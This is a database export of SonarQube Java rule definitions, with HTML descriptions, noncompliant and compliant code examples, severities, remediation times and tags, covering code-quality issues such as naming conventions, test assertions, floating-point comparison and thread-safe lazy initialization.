673	Artifact ids should follow a naming convention	S3420	S3420	squid	<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a pom's <code>artifactId</code> does not match the provided regular expression.</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression: <code>[a-z][a-z-0-9]+</code></p>\n<pre>\n&lt;project ...&gt;\n  &lt;artifactId&gt;My_Project&lt;/artifactId&gt;  &lt;!-- Noncompliant --&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n&lt;project ...&gt;\n  &lt;artifactId&gt;my-project&lt;/artifactId&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention,maven	f	HTML	1511453807209	1511453807209	1
685	JUnit assertions should include messages	S2698	S2698	squid	<p>Adding messages to JUnit assertions is an investment in your future productivity. Spend a few seconds writing them now, and you'll save a lot of time on the other end when either the tests fail and you need to quickly diagnose the problem, or when you need to maintain the tests and the assertion messages work as a sort of documentation.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nassertEquals(4, list.size());  // Noncompliant\n\nassertThat(list.get(0)).isEqualTo("pear");  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nassertEquals("There should have been 4 Fruits in the list", 4, list.size());\n\nassertThat(list.get(0)).as("check first element").overridingErrorMessage("The first element should be a pear, not a %s", list.get(0)).isEqualTo("pear"); \n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	tests	f	HTML	1511453807219	1511453807220	1
674	Floating point numbers should not be tested for equality	S1244	S1244	squid	<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is not associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be different based on the order of those operation because of the rounding that takes place at each step.</p>\n<p>Even simple floating point assignments are not simple:</p>\n<pre>\nfloat f = 0.1; // 0.100000001490116119384765625\ndouble d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625\n</pre>\n<p>(Results will vary based on compiler and compiler settings);</p>\n<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values is almost always an error, and the use of other comparison operators (<code>&gt;</code>, <code>&gt;=</code>, <code>&lt;</code>, <code>&lt;=</code>) is also problematic because they don't work properly for -0 and <code>NaN</code>. </p>\n<p>Instead the best course is to avoid floating point comparisons altogether. When that is not possible, you should consider using one of Java's float-handling <code>Numbers</code> such as <code>BigDecimal</code> which can properly handle floating point comparisons. A third option is to look not for equality but for whether the value is close enough. I.e. compare the absolute value of the difference between the stored value and the expected value against a margin of acceptable error. Note that this does not cover all cases (<code>NaN</code> and <code>Infinity</code> for instance).</p>\n<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre> \nfloat myNumber = 3.146; \nif ( myNumber == 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be false \n  // ... \n} \nif ( myNumber != 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be true \n  // ... \n} \n\nif (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant; indirect inequality test\n  // ...\n}\n\nfloat zeroFloat = 0.0f;\nif (zeroFloat == 0) {  // Noncompliant. Computations may end up with a value close but not equal to zero.\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>Since <code>NaN</code> is not equal to itself, the specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>\n<pre>\nfloat f;\ndouble d;\nif(f != f) { // Compliant; test for NaN value\n  System.out.println("f is NaN");\n} else if (f != d) { // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> MISRA C:2004, 13.3 - Floating-point expressions shall not be tested for equality or inequality.\n</li><li> MISRA C++:2008, 6-2-2 - Floating-point expressions shall not be directly or indirectly tested for equality or inequality\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra	f	HTML	1511453807210	1511453807211	2
675	pom elements should be in the recommended order	S3423	S3423	squid	<p>The POM Code Convention convention recommends listing modifiers in the following order:</p>\n<ol>\n<li> &lt;modelVersion/&gt;\n</li><li> &lt;parent/&gt;\n</li><li> &lt;groupId/&gt;\n</li><li> &lt;artifactId/&gt;\n</li><li> &lt;version/&gt;\n</li><li> &lt;packaging/&gt;\n</li><li> &lt;name/&gt;\n</li><li> &lt;description/&gt;\n</li><li> &lt;url/&gt;\n</li><li> &lt;inceptionYear/&gt;\n</li><li> &lt;organization/&gt;\n</li><li> &lt;licenses/&gt;\n</li><li> &lt;developers/&gt;\n</li><li> &lt;contributors/&gt;\n</li><li> &lt;mailingLists/&gt;\n</li><li> &lt;prerequisites/&gt;\n</li><li> &lt;modules/&gt;\n</li><li> &lt;scm/&gt;\n</li><li> &lt;issueManagement/&gt;\n</li><li> &lt;ciManagement/&gt;\n</li><li> &lt;distributionManagement/&gt;\n</li><li> &lt;properties/&gt;\n</li><li> &lt;dependencyManagement/&gt;\n</li><li> &lt;dependencies/&gt;\n</li><li> &lt;repositories/&gt;\n</li><li> &lt;pluginRepositories/&gt;\n</li><li> &lt;build/&gt;\n</li><li> &lt;reporting/&gt;\n</li><li> &lt;profiles/&gt;\n</li></ol>\n<p>Not following this convention has no technical impact, but will reduce the pom's readability because most developers are used to the standard order.</p>\n\n<h2>See</h2>\n<ul>\n<li> <a href="https://maven.apache.org/developers/conventions/code.html#POM_Code_Convention">POM Code Convention</a>\n</li></ul>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	convention,maven	f	HTML	1511453807212	1511453807212	1
676	Close curly brace and the next "else", "catch" and "finally" keywords should be located on the same line	RightCurlyBraceSameLineAsNextBlockCheck	RightCurlyBraceSameLineAsNextBlockCheck	squid	<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place closing curly braces on the same line as the next <code>else</code>, <code>catch</code> or <code>finally</code> keywords.</p>\n<p>The following code snippet illustrates this rule:</p>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {          // Compliant\n    doSomethingElse();\n  }\n  else {                               // Noncompliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {              // Compliant\n    log(e);\n  }\n  finally {                            // Noncompliant\n    closeConnection();\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807212	1511453807213	1
680	Literal boolean values should not be used in condition expressions	S1125	S1125	squid	<p>Remove literal boolean values from conditional expressions to improve readability. Anything that can be tested for equality with a boolean value must itself be a boolean value, and boolean values can be tested atomically.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (booleanVariable == true) { /* ... */ }\nif (booleanVariable != true) { /* ... */ }\nif (booleanVariable || false) { /* ... */ }\ndoSomething(!false);\n\nbooleanVariable = condition ? true : exp;\nbooleanVariable = condition ? false : exp;\nbooleanVariable = condition ?  exp : true;\nbooleanVariable = condition ?  exp : false;\nbooleanVariable = condition ?  true : false;\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (booleanVariable) { /* ... */ }\nif (!booleanVariable) { /* ... */ }\nif (booleanVariable) { /* ... */ }\ndoSomething(true);\n\nbooleanVariable = condition || exp;\nbooleanVariable = !condition &amp;&amp; exp;\nbooleanVariable = !condition ||  exp;\nbooleanVariable = condition &amp;&amp; exp;\nbooleanVariable = condition;\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807215	1511453807215	1
681	Local Variables should not be declared and then immediately returned or thrown	S1488	S1488	squid	<p>Declaring a variable only to immediately return or throw it is a bad practice.\nSome developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to know exactly what will be returned.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic long computeDurationInMilliseconds() {\n  long duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;\n  return duration;\n}\n\npublic void doSomething() {\n  RuntimeException myException = new RuntimeException();\n  throw myException;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic long computeDurationInMilliseconds() {\n  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;\n}\n\npublic void doSomething() {\n  throw new RuntimeException();\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807216	1511453807216	1
682	Resources as defined by user should be closed	S3546	S3546	squid	<p>Leaking resources in an application is never a good idea, as it can lead to memory issues, and even the crash of the application. This rule template allows you to specify which constructions open a resource and how it is closed in order to raise issue within a method scope when custom resources are leaked.</p>\n\n<h2>See also</h2>\n<ul>\n<li> {rule:squid:S2095} - Resources should be closed\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	denial-of-service	t	HTML	1511453807217	1511453807217	3
683	Tests should include assertions	S2699	S2699	squid	<p>\n  A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the code under test.\n</p>\n<p>\n  This rule raises an exception when no assertions are found in a JUnit test.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testDoSomething() {  // Noncompliant\n  MyClass myClass = new MyClass();\n  myClass.doSomething();\n  assertThat(myClass.doSomething());  // Fest assertion stub with no checks\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testDoSomething() {\n  MyClass myClass = new MyClass();\n  assertNull(myClass.doSomething());  // JUnit assertion\n  assertThat(myClass.doSomething()).isNull();  // Fest assertion\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	tests	f	HTML	1511453807218	1511453807218	1
684	Return of boolean expressions should not be wrapped into an "if-then-else" statement	S1126	S1126	squid	<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (expression) {  \n  return true;\n} else {\n  return false;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nreturn expression; \n</pre>\n<pre>\nreturn !!expression;\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807219	1511453807219	1
688	Redundant casts should not be used	S1905	S1905	squid	<p>Unnecessary casting expressions make the code harder to read and understand.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void example() {\n  for (Foo obj : (List&lt;Foo&gt;) getFoos()) {  // Noncompliant; cast unnecessary because List&lt;Foo&gt; is what's returned\n  //...\n  }\n}\n\npublic List&lt;Foo&gt; getFoos() {\n  return this.foos;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void example() {\n  for (Foo obj : getFoos()) {\n    //...\n  }\n}\n\npublic List&lt;Foo&gt; getFoos() {\n  return this.foos;\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>Casting may be required to distinguish the method to call in the case of overloading:</p>\n<pre>\nclass A {}\nclass B extends A{}\nclass C {\n  void fun(A a){}\n  void fun(B b){}\n\n  void foo() {\n    B b = new B();\n    fun(b);\n    fun((A) b); //call the first method so cast is not redundant.\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807221	1511453807222	1
689	Useless imports should be removed	UselessImportCheck	UselessImportCheck	squid	<p>\nThe imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer.\nUnused and useless imports should not occur if that is the case.\nLeaving them in reduces the code's readability, since their presence can be confusing.\n</p>\n\n<p>The following code snippet illustrates this rule:</p>\n\n<pre>\npackage my.company;\n\nimport java.lang.String;        // Noncompliant - java.lang classes are always implicitly imported\nimport my.company.SomeClass;    // Noncompliant - same package files are always implicitly imported\nimport java.io.File;            // Noncompliant - File is not used\n\nimport my.company2.SomeType;\nimport my.company2.SomeType;    // Noncompliant - 'SomeType' is already imported\n\nclass ExampleClass {\n\n  public String someString;\n  public SomeType something;\n\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	unused	f	HTML	1511453807223	1511453807223	1
690	Cycles between packages should be removed	CycleBetweenPackages	CycleBetweenPackages	squid	<p>When several packages are involved in a cycle (package A &gt; package B &gt; package C &gt; package A, where "&gt;" means "depends upon"), that means those packages are highly coupled, and there is no way to reuse/extract one of those packages without importing all the other packages. Such cycle could quickly increase the effort required to maintain an application and embrace business change.</p>\n<p>SonarQube not only detect cycles between packages, but also calculates the minimum effort to break those cycles. This rule logs a violation on each source file having an outgoing dependency to be cut in order to break a cycle.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1d	\N	\N	design	f	HTML	1511453807223	1511453807223	1
691	"switch" statements should not have too many "case" clauses	S1479	S1479	squid	<p>When <code>switch</code> statements have a large set of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map structure would be more readable and maintainable, and should be used instead.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	brain-overload	f	HTML	1511453807224	1511453807224	1
692	Unused type parameters should be removed	S2326	S2326	squid	<p>Type parameters that aren't used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type parameters should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nint &lt;T&gt; Add(int a, int b) // Noncompliant; &lt;T&gt; is ignored\n{\n  return a + b; \n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nint Add(int a, int b)\n{\n  return a + b; \n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453807225	1511453807226	1
695	Wildcard imports should not be used	S2208	S2208	squid	<p>Blindly importing all the classes in a package clutters the class namespace and could lead to conflicts between classes in different packages with the same name. On the other hand, specifically listing the necessary classes avoids that problem and makes clear which versions were wanted.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nimport java.sql.*; // Noncompliant\nimport java.util.*; // Noncompliant\n\nprivate Date date; // Date class exists in java.sql and java.util. Which one is this?\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nimport java.sql.Date;\nimport java.util.List;\nimport java.util.ArrayList;\n\nprivate Date date;\n</pre>\n<h2>Exceptions</h2>\n\n<p>Static imports are ignored by this rule. E.G.</p>\n<pre>\nimport static java.lang.Math.*;\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807228	1511453807228	1
696	Disallowed dependencies should not be used	S3417	S3417	squid	<p>Whether they are disallowed locally for security, license, or dependability reasons, forbidden dependencies should not be used. </p>\n<p>This rule raises an issue when the group or artifact id of a dependency matches the configured forbidden dependency pattern. </p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With a parameter of: <code>*:.*log4j.*</code></p>\n<pre> \n&lt;dependency&gt; &lt;!-- Noncompliant --&gt; \n    &lt;groupId&gt;log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j&lt;/artifactId&gt; \n    &lt;version&gt;1.2.17&lt;/version&gt; \n&lt;/dependency&gt; \n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	maven	t	HTML	1511453807229	1511453807229	1
697	"static" members should be accessed statically	S2209	S2209	squid	<p>\n  While it is <em>possible</em> to access <code>static</code> members from a class instance, it's bad form,\n  and considered by most to be misleading because it implies to the readers of your code that\n  there's an instance of the member per class instance.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    first.counter ++;  // Noncompliant\n    second.counter ++;  // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    A.counter ++;  // Compliant\n    A.counter ++;  // Compliant\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807230	1511453807230	1
698	Group ids should follow a naming convention	S3419	S3419	squid	<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the a pom's <code>groupId</code> does not match the provided regular expression.</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression: <code>(com|org)(\\.[a-z][a-z-0-9]*)+</code></p>\n<pre>\n&lt;project ...&gt;\n  &lt;groupId&gt;myCo&lt;/groupId&gt;  &lt;!-- Noncompliant --&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n&lt;project ...&gt;\n  &lt;groupId&gt;com.myco&lt;/groupId&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention,maven	f	HTML	1511453807231	1511453807231	1
699	"NOSONAR" should not be used to switch off issues	NoSonar	NoSonar	squid	<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results but sometimes it can abusively be used to hide real quality flaws.</p>\n<p>This rule allows to track and/or forbid use of this marker.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	bad-practice	f	HTML	1511453807232	1511453807233	1
700	Classes with only "static" methods should not be instantiated	S2440	S2440	squid	<p><code>static</code> methods can be accessed without an instance of the enclosing class, so there's no reason to instantiate a class that has only <code>static</code> methods.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll("<[^>]+>", "");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    TextUtils textUtils = new TextUtils(); // Noncompliant\n\n    String stripped = textUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll("<[^>]+>", "");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    String stripped = TextUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n\n<h2>See Also</h2>\n<ul>\n    <li>{rule:squid:S1118} - Utility classes should not have public constructors</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807233	1511453807233	1
701	Multiline blocks should be enclosed in curly braces	S2681	S2681	squid	<p>\n  Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be misleading and induce bugs.\n</p>\n<p>\n  This rule raises an issue when the indentation of the lines after a one-line block indicates an intent to include those lines in the block,\n  but the omission of curly braces means the lines will be unconditionally executed once.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition)\n  firstActionInBlock();\n  secondAction();  // Noncompliant; executed unconditionally\nthirdAction();\n\nString str = null;\nfor (int i = 0; i < array.length; i++)\n  str = array[i];\n  doTheThing(str);  // Noncompliant; executed only on last array element\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (condition) {\n  firstActionInBlock();\n  secondAction();\n}\nthirdAction();\n\nString str = null;\nfor (int i = 0; i < array.length; i++) {\n  str = array[i];\n  doTheThing(str);\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807234	1511453807234	2
702	"compareTo" results should not be checked for specific values	S2200	S2200	squid	While most <code>compareTo</code> methods return -1, 0, or 1, some do not, and testing the result of a <code>compareTo</code> against a specific value other than 0 could result in false negatives.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (myClass.compareTo(arg) == -1) {  // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (myClass.compareTo(arg) &lt; 0) {\n  // ...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unpredictable	f	HTML	1511453807235	1511453807235	1
703	"Lock" objects should not be "synchronized"	S2442	S2442	squid	<p>\n<code>java.util.concurrent.locks.Lock</code> offers far more powerful and flexible locking operations than are available with <code>synchronized</code> blocks.\nSo synchronizing on a <code>Lock</code> throws away the power of the object, and is just silly.\nInstead, such objects should be locked and unlocked using <code>tryLock()</code> and <code>unlock()</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nLock lock = new MyLockImpl();\nsynchronized(lock) {  // Noncompliant\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nLock lock = new MyLockImpl();\nlock.tryLock();\n//...\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	clumsy,multi-threading	f	HTML	1511453807235	1511453807236	1
704	Non-serializable objects should not be stored in "HttpSessions"	S2441	S2441	squid	<p>If you have no intention of writting an <code>HttpSession</code> object to file, then storing non-<code>serializable</code> objects in it may not seem like a big deal. But whether or not you explicitly serialize the session, it may be written to disk anyway, as the server manages its memory use in a process called "passivation". Further, some servers automatically write their active sessions out to file at shutdown &amp; deserialize any such sessions at startup.</p>\n<p>The point is, that even though <code>HttpSession</code> does not <code>extend Serializable</code>, you must nonetheless assume that it will be serialized, and </p>\n<p>understand that if you've stored non-serializable objects in the session, errors will result. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Address {\n  //...\n}\n\n//...\nHttpSession session = request.getSession();\nsession.setAttribute("address", new Address());  // Noncompliant; Address isn't serializable\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/579.html">MITRE, CWE-579</a> - J2EE Bad Practices: Non-serializable Object Stored in Session</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe	f	HTML	1511453807236	1511453807236	2
705	Collections.emptyList(), emptyMap() and emptySet() should be used instead of Collections.EMPTY_LIST, EMPTY_MAP and EMPTY_SET	S1596	S1596	squid	<p>Since the introduction of generics in Java 5, it is recommended to use generic types such as <code>List&lt;String&gt;</code> instead of raw ones such as just <code>List</code>. Assigning a raw type into a generic one is not type safe, and will generate a warning. The old <code>EMPTY_...</code> fields of the <code>Collections</code> class return raw types, whereas the newer <code>empty...()</code> methods return generic ones.</p>\n<p>Developers will also more easily find the <code>emptyIterator()</code> and <code>emptyListIterator()</code> methods for which there is no field equivalent if they are used to call the methods.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nList&lt;String&gt; collection1 = Collections.EMPTY_LIST;\nMap&lt;String, String&gt; collection2 = Collections.EMPTY_MAP;\nSet&lt;String&gt; collection3 = Collections.EMPTY_SET;\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nList&lt;String&gt; collection1 = Collections.emptyList();\nMap&lt;String, String&gt; collection2 = Collections.emptyMap();\nSet&lt;String&gt; collection3 = Collections.emptySet();\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	obsolete,pitfall	f	HTML	1511453807237	1511453807238	1
706	Lazy initialization of "static" fields should be "synchronized"	S2444	S2444	squid	<p>In a multi-threaded situation, un-<code>synchronized</code> lazy initialization of non-<code>volatile</code> fields could mean that a second thread has access to a half-initizliaed object while the first thread is still creating it. Allowing such access could cause serious bugs. Instead. the initizliation block should be <code>synchronized</code> or the variable made <code>volatile</code>.</p>\n<p>Similarly, updates of such fields should also be <code>synchronized</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nprotected static Object instance = null;\n\npublic static Object getInstance() {\n    if (instance != null) {\n        return instance;\n    }\n\n    instance = new Object();  // Noncompliant\n    return instance;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nprotected static volatile Object instance = null;\n\npublic static Object getInstance() {\n    if (instance != null) {\n        return instance;\n    }\n\n    instance = new Object();\n    return instance;\n}\n</pre>\n<p>or </p>\n<pre>\nprotected static Object instance = null;\n\npublic static synchronized Object getInstance() {\n    if (instance != null) {\n        return instance;\n    }\n\n    instance = new Object();\n    return instance;\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	multi-threading	f	HTML	1511453807238	1511453807238	2
714	Extensions and implementations should not be redundant	S1939	S1939	squid	<p>\nAll classes extend <code>Object</code> implicitly. Doing so explicitly is redundant.\n</p>\n\n<p>\n  Further, declaring the implementation of an interface <em>and</em> one if its parents is also redundant.\n  If you implement the interface, you also implicitly implement its parents and there's no need to do so explicitly.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo\n    extends Object // Noncompliant\n    implements MyFace, MyOtherFace {  // Noncompliant\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo implements MyOtherFace {\n  //...\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	clumsy	f	HTML	1511453807245	1511453807246	1
707	Return values should not be ignored when function calls don't have any side effects	S2201	S2201	squid	<p>When the call to a function doesn't have any side effect, what is the point of ignoring the result of the function call ? In such case, either the function call is useless and should be dropped or the source code doesn't behave as expected. </p>\n<p>To prevent generating any false-positives, this rule triggers an issues only on the following predefined list of immutable classes in the Java API : String, Boolean, Integer, Double, Float, Byte, Character, Short, StackTraceElement.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void handle(String command){\n  command.toLowerCase(); // Noncompliant; result of method thrown away\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void handle(String command){\n  String formattedCommand = command.toLowerCase();\n  ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2012, 17.7 - The value returned by a function having non-void return type shall be used</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C</a> - Do not ignore values returned by functions</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/eoAyAQ">CERT, EXP12-CPP</a> - Do not ignore values returned by functions or methods</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,misra	f	HTML	1511453807239	1511453807239	2
708	Package declaration should match source file directory	S1598	S1598	squid	<p>By convention, a Java class' physical location (source directories) and its logical representation (packages) should be kept in sync. Thus a Java file located at "src/org/sonarqube/Foo.java" should have a package of "org.sonarqube".</p>\n\n<p>Unfortunately, this convention is not enforced by Java compilers, and nothing prevents a developer from making the "Foo.java" class part of the "com.apple" package, which could degrade the maintainability of both the class and its application.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807240	1511453807240	1
709	".equals()" should not be used to test the values of "Atomic" classes	S2204	S2204	squid	<p><code>AtomicInteger</code>, and <code>AtomicLong</code> extend <code>Number</code>, but they're distinct from <code>Integer</code> and <code>Long</code> and should be handled differently. <code>AtomicInteger</code> and <code>AtomicLong</code> are designed to support lock-free, thread-safe programming on single variables. As such, an <code>AtomicInteger</code> will only ever be "equal" to itself. Instead, you should <code>.get()</code> the value and make comparisons on it.</p>\n\n<p>This applies to all the atomic, seeming-primitive wrapper classes: <code>AtomicInteger</code>, <code>AtomicLong</code>, and <code>AtomicBoolean</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nAtomicInteger aInt1 = new AtomicInteger(0);\nAtomicInteger aInt2 = new AtomicInteger(0);\n\nif (aInt1.equals(aInt2)) { ... }  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nAtomicInteger aInt1 = new AtomicInteger(0);\nAtomicInteger aInt2 = new AtomicInteger(0);\n\nif (aInt1.get() == aInt2.get()) { ... }\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807241	1511453807241	2
